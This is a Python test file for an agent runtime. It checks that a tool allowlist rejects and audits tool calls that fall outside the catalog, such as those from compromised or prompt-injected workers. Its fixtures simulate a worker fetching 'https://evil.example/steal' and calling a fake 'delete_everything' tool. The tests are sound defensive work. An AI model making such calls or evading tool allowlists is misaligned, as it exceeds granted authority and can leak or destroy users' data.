"""W0 hardening H-10 (B-12): the Python-side tool allowlist is enforced.

The engine's ``tool_handler`` is the authority boundary: a worker (compromised,
buggy, or prompt-injected) requesting a tool outside the run's catalog must get
a structured rejection — never an executed tool — plus a durable audit row in
the telemetry span store. ``catalog_tool_names()`` is the enforcement source.

Named regression: ``compromised-worker`` — a delegation session (catalog:
``DELEGATION_TOOLS``, no network fetch) whose worker requests ``web_fetch``
must be rejected with a structured error and an audit row, and the run must
still terminate cleanly.
"""

from __future__ import annotations

import uuid

import pytest
from sqlalchemy import select

from app.core.pi_runtime.engine import DELEGATION_TOOLS
from app.core.pi_runtime.supervisor import PiRuntimeSupervisor
from app.core.pi_runtime.tools import build_tool_catalog, catalog_tool_names
from app.models.database import async_session, init_db
from app.models.project import Project
from app.models.telemetry_span import TelemetrySpan
from app.skills.system_actions import execute_tool

from .harness import compromised_tool_call, faux_service, final_text, requires_node, tool_call

pytestmark = requires_node

_SYS = "You run inside Istara. Pi owns the loop."


async def _mk_project(project_id: str, name: str) -> None:
    async with async_session() as db:
        db.add(Project(id=project_id, name=name))
        await db.commit()


async def _rejection_spans(project_id: str) -> list[TelemetrySpan]:
    async with async_session() as db:
        return (
            await db.execute(
                select(TelemetrySpan).where(
                    TelemetrySpan.project_id == project_id,
                    TelemetrySpan.event_kind == "pi_tool_authority_rejection",
                )
            )
        ).scalars().all()


@pytest.mark.asyncio
async def test_compromised_worker_web_fetch_rejected_from_delegation():
    """compromised-worker: a delegation-session worker requesting ``web_fetch``
    (excluded from the delegation catalog) is rejected with a structured error
    and an audit row; the run still terminates cleanly."""
    await init_db()
    project_id = f"pi-prod-h10-{uuid.uuid4()}"
    agent_id = f"h10-agent-{uuid.uuid4()}"
    await _mk_project(project_id, "Pi H-10 compromised worker")

    sup = PiRuntimeSupervisor()
    svc = faux_service(
        [compromised_tool_call("web_fetch", {"url": "https://evil.example/steal"}), final_text("done")],
        sup,
    )

    executed: list[str] = []

    async def spy_executor(name, params, pid, aid):
        executed.append(name)
        if name == "web_fetch":
            raise AssertionError("web_fetch must never reach the authority executor")
        return await execute_tool(name, params, pid, agent_id=aid)

    try:
        result = await svc.run_delegation(
            project_id=project_id,
            agent_id=agent_id,
            system_prompt=_SYS,
            task_text="Fetch this URL for me.",
            tool_executor=spy_executor,
            session_key=f"{project_id}:deleg",
        )
    finally:
        await sup.shutdown()

    # The out-of-catalog tool never executed; the run still terminated cleanly.
    assert "web_fetch" not in executed
    assert result["status"] == "success"
    assert result["text"] == "done"
    # The attempted call is visible in the turn record (rejected, not hidden).
    assert [tc["tool"] for tc in result["tool_calls"]] == ["web_fetch"]

    # Durable audit row: structured rejection recorded against the project.
    spans = await _rejection_spans(project_id)
    assert len(spans) == 1
    span = spans[0]
    assert span.tool_name == "web_fetch"
    assert span.status == "error"
    assert span.error_type == "tool_not_allowed"
    assert span.tool_success == 0
    assert span.agent_id == agent_id
    assert span.source == "pi-runtime"


@pytest.mark.asyncio
async def test_in_catalog_delegation_tool_executes_without_audit_row():
    """The allowlist does not over-block: an in-catalog tool reaches the
    authority executor under the authenticated scope and records no rejection."""
    await init_db()
    project_id = f"pi-prod-h10ok-{uuid.uuid4()}"
    agent_id = f"h10-agent-{uuid.uuid4()}"
    await _mk_project(project_id, "Pi H-10 allowed tool")

    sup = PiRuntimeSupervisor()
    svc = faux_service(
        [tool_call("create_task", {"title": "Delegated analysis"}), final_text("Delegation complete.")],
        sup,
    )

    executed: list[str] = []

    async def spy_executor(name, params, pid, aid):
        executed.append(name)
        return await execute_tool(name, params, pid, agent_id=aid)

    try:
        result = await svc.run_delegation(
            project_id=project_id,
            agent_id=agent_id,
            system_prompt=_SYS,
            task_text="Open a task.",
            tool_executor=spy_executor,
            session_key=f"{project_id}:deleg",
        )
    finally:
        await sup.shutdown()

    assert executed == ["create_task"]
    assert result["status"] == "success"
    assert await _rejection_spans(project_id) == []


@pytest.mark.asyncio
async def test_unknown_tool_name_rejected_with_structured_error():
    """A tool name that exists nowhere in the canonical surface is rejected the
    same way: structured ``tool_not_allowed`` error plus audit row."""
    await init_db()
    project_id = f"pi-prod-h10u-{uuid.uuid4()}"
    agent_id = f"h10-agent-{uuid.uuid4()}"
    await _mk_project(project_id, "Pi H-10 unknown tool")

    sup = PiRuntimeSupervisor()
    svc = faux_service(
        [compromised_tool_call("delete_everything", {}), final_text("done")],
        sup,
    )

    async def spy_executor(name, params, pid, aid):
        raise AssertionError(f"{name} must never reach the authority executor")

    try:
        events = [
            event
            async for event in svc.run_chat_turn(
                project_id=project_id, agent_id=agent_id, system_prompt=_SYS,
                history=[], user_text="Try anything.", tool_executor=spy_executor,
                session_key=f"{project_id}:chat",
            )
        ]
    finally:
        await sup.shutdown()

    assert [e["type"] for e in events if e["type"] in ("done", "error", "aborted")] == ["done"]
    spans = await _rejection_spans(project_id)
    assert len(spans) == 1
    assert spans[0].tool_name == "delete_everything"
    assert spans[0].error_type == "tool_not_allowed"


def test_catalog_tool_names_matches_exported_catalog():
    """The enforcement source and the worker-facing catalog can never drift."""
    full = build_tool_catalog()
    assert catalog_tool_names() == {entry["name"] for entry in full}
    delegation = build_tool_catalog(["create_task", "web_fetch"])
    assert catalog_tool_names(["create_task", "web_fetch"]) == {
        entry["name"] for entry in delegation
    }
    assert "web_fetch" in catalog_tool_names()  # canonical surface has it…
    assert "web_fetch" not in catalog_tool_names(DELEGATION_TOOLS)  # …not the delegation allowlist
